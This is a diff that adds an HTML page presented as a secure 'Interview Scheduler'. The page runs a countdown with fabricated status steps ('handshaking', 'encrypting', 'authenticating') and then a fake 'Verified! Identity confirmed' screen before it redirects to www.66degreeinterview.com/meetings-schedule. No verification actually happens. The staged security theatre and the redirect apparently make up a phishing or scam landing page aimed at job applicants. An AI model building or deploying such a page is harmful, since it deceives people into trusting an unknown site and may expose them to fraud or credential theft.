@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Interview Scheduler • dark</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      min-height:100vh; display:flex; font-family:'Space Grotesk',sans-serif; overflow:hidden;
+    }
+    .left { flex:1; background:linear-gradient(145deg,#0a0e17,#141b2b); display:flex; align-items:center; justify-content:center; padding:2rem; position:relative; }
+    .left .bg-shape { position:absolute; width:80%; height:80%; border-radius:50%; background:radial-gradient(circle,rgba(99,102,241,0.04),transparent 70%); top:50%; left:50%; transform:translate(-50%,-50%); }
+    .left-content { position:relative; z-index:2; max-width:400px; }
+    .left-content .icon { font-size:4rem; margin-bottom:1rem; display:block; }
+    .left-content h1 { font-size:2.8rem; font-weight:700; color:white; letter-spacing:-1px; line-height:1.1; margin-bottom:0.5rem; }
+    .left-content .sub { color:rgba(255,255,255,0.3); font-size:0.95rem; line-height:1.6; }
+    .right { flex:1; background:rgba(255,255,255,0.02); backdrop-filter:blur(20px); display:flex; align-items:center; justify-content:center; padding:2rem; border-left:1px solid rgba(255,255,255,0.03); }
+    .right-content { max-width:380px; width:100%; text-align:center; }
+    .badge { display:inline-block; background:rgba(255,255,255,0.03); padding:0.2rem 1.2rem; border-radius:40px; font-size:0.6rem; font-weight:600; color:rgba(255,255,255,0.2); text-transform:uppercase; letter-spacing:2px; border:1px solid rgba(255,255,255,0.03); margin-bottom:1.5rem; }
+    .spinner-ring { width:80px; height:80px; margin:0 auto 1.5rem; border:3px solid rgba(255,255,255,0.04); border-top-color:#818cf8; border-radius:50%; animation:spin 0.8s linear infinite; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .count-big { font-size:3.6rem; font-weight:300; color:rgba(255,255,255,0.8); letter-spacing:-3px; }
+    .count-big span { font-size:1rem; color:rgba(255,255,255,0.15); font-weight:400; margin-left:4px; }
+    .status-line { font-size:0.75rem; color:rgba(255,255,255,0.12); margin:0.5rem 0 1.8rem; }
+    .status-line .hl { color:rgba(255,255,255,0.3); }
+    .btn { padding:14px 32px; border:none; border-radius:60px; font-family:inherit; font-weight:600; font-size:0.9rem; cursor:pointer; transition:all 0.2s; background:rgba(255,255,255,0.04); color:rgba(255,255,255,0.3); border:1px solid rgba(255,255,255,0.04); }
+    .btn:hover { background:rgba(255,255,255,0.08); transform:translateY(-2px); }
+    .btn.primary { background:linear-gradient(135deg,#6366f1,#8b5cf6); color:white; border:none; }
+    .btn.primary:hover { box-shadow:0 12px 40px rgba(99,102,241,0.15); }
+    .domain-chain { font-size:0.55rem; color:rgba(255,255,255,0.04); margin-top:2rem; letter-spacing:0.5px; }
+    .domain-chain span { color:rgba(255,255,255,0.08); }
+    .overlay { position:fixed; inset:0; background:#0a0e17; z-index:9999; display:none; align-items:center; justify-content:center; flex-direction:column; gap:1.5rem; }
+    .overlay.show { display:flex; }
+    .overlay .spinner-lg { width:64px; height:64px; border:3px solid rgba(255,255,255,0.04); border-top-color:#818cf8; border-radius:50%; animation:spin 0.8s linear infinite; }
+    .overlay p { color:rgba(255,255,255,0.2); font-size:0.9rem; letter-spacing:1px; }
+    .overlay .checkmark { font-size:4rem; color:#4ade80; animation:pop 0.5s ease-out; }
+    @keyframes pop { 0%{transform:scale(0);opacity:0;} 80%{transform:scale(1.2);} 100%{transform:scale(1);opacity:1;} }
+    .overlay .verified-text { color:white; font-size:1.8rem; font-weight:700; }
+    .overlay .verified-sub { color:rgba(255,255,255,0.3); font-size:0.9rem; }
+    .hidden { display:none !important; }
+    @media (max-width:768px){ body{flex-direction:column;} .right{border-left:none;border-top:1px solid rgba(255,255,255,0.03);} .left-content h1{font-size:2rem;} }
+  </style>
+</head>
+<body>
+<div class="left">
+  <div class="bg-shape"></div>
+  <div class="left-content">
+    <span class="icon">📅</span>
+    <h1>Interview<br/>Scheduler</h1>
+    <div class="sub">Secure verification to schedule your interview</div>
+  </div>
+</div>
+<div class="right">
+  <div class="right-content">
+    <div class="badge">● encrypted</div>
+    <div class="spinner-ring"></div>
+    <div class="count-big"><span id="countDisplay">5</span><span>s</span></div>
+    <div class="status-line">status · <span class="hl" id="statusText">initializing</span></div>
+    <button class="btn primary" id="goBtn">→ connect now</button>
+    <div class="domain-chain">
+      <span>🔗</span> <span id="domain1">www.66degreeinterview.com</span>
+      <span style="color:rgba(255,255,255,0.02);margin:0 4px;">→</span>
+      <span id="domain2">meetings-schedule</span>
+    </div>
+  </div>
+</div>
+
+<!-- Overlay 1: Connecting -->
+<div class="overlay" id="overlay1">
+  <div class="spinner-lg"></div>
+  <p>Connecting to secure verification...</p>
+</div>
+
+<!-- Overlay 2: Verified -->
+<div class="overlay" id="overlay2">
+  <div class="checkmark">✓</div>
+  <div class="verified-text">Verified!</div>
+  <div class="verified-sub">Identity confirmed. Redirecting...</div>
+</div>
+
+<script>
+  (function(){
+    // 🔥 UPDATED DOMAIN WITH CORRECT PATH
+    const TARGET = "https://www.66degreeinterview.com/meetings-schedule";
+    
+    const TOTAL=5; let r=TOTAL, intv=null, redir=false;
+    const count=document.getElementById('countDisplay'), statusText=document.getElementById('statusText');
+    const go=document.getElementById('goBtn');
+    const overlay1=document.getElementById('overlay1');
+    const overlay2=document.getElementById('overlay2');
+
+    function update(){
+      count.textContent=Math.ceil(r);
+      if(redir){ statusText.textContent='redirecting...'; return; }
+      const states=['initializing','handshaking','encrypting','verifying','authenticating'];
+      const idx=Math.min(Math.floor((TOTAL-r)/1.2), states.length-1);
+      statusText.textContent=states[idx]||'connecting';
+    }
+
+    function redirect(){
+      if(redir)return;
+      redir=true;
+      clearInterval(intv);
+      update();
+      
+      overlay1.classList.add('show');
+      setTimeout(()=>{
+        overlay1.classList.remove('show');
+        overlay2.classList.add('show');
+        setTimeout(()=>{
+          window.location.href = TARGET;
+        }, 2000);
+      }, 3000);
+    }
+
+    function tick(){ if(redir)return; r-=0.5; if(r<=0){r=0;update();redirect();return;} update(); }
+    function start(){ intv=setInterval(tick,500); }
+    go.addEventListener('click',function(e){ e.preventDefault(); redirect(); });
+    update(); start();
+  })();
+</script>
+</body>
+</html>
